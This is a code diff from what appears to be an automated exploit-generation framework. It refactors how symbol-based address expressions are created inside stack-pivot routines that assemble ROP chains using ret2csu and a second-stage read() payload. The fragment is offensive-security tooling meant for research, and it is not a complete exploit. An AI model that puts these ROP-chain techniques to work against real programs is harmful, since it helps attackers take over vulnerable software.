@@ -57,6 +57,8 @@ void BasicStackPivot::initialize() {
 
 
 std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
+    using BaseType = BaseOffsetExpr::BaseType;
+
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -71,7 +73,7 @@ std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
     // Write the 2nd stage ROP payload via read() to `pivot_dest`
     // via ret2csu(read, 0, pivot_dest, 1024).
     RopSubchain part2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
         ConstantExpr::create(1024, Expr::Int64))[0];
@@ -129,6 +131,8 @@ bool AdvancedStackPivot::checkRequirements() const {
 }
 
 std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
+    using BaseType = BaseOffsetExpr::BaseType;
+
     assert(m_readCallSites.size() &&
            "AdvancedStackPivot requires at least one call site of read@libc");
 
@@ -160,7 +164,7 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
                                 ConstantExpr::create(i + 1, Expr::Int64))));
 
         ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
-        ref<Expr> e3 = BaseOffsetExpr::create(elf, "sym", "read");
+        ref<Expr> e3 = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");
 
         part1.push_back(e0);
         part1.push_back(e1);
@@ -175,13 +179,13 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
         uint64_t elfBase = exploit.getElf().getBase();
         uint64_t pivotDest = elfBase + exploit.getSymbolValue("pivot_dest");
         ret2csu->setGadget2CallTarget(pivotDest + 8 + 0x30 - elf.getBase());
-        part1[6] = BaseOffsetExpr::create(elf, "sym", "_fini");
+        part1[6] = BaseOffsetExpr::create<BaseType::SYM>(elf, "_fini");
     }
 
     // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
     // read(0, target_base + pivot_dest + 0x30 * 7, 0x400).
     RopSubchain part2 = ret2csu->getRopSubchains(
-            BaseOffsetExpr::create(elf, "sym", "read"),
+            BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
                     BaseOffsetExpr::create(exploit, elf, "pivot_dest"),
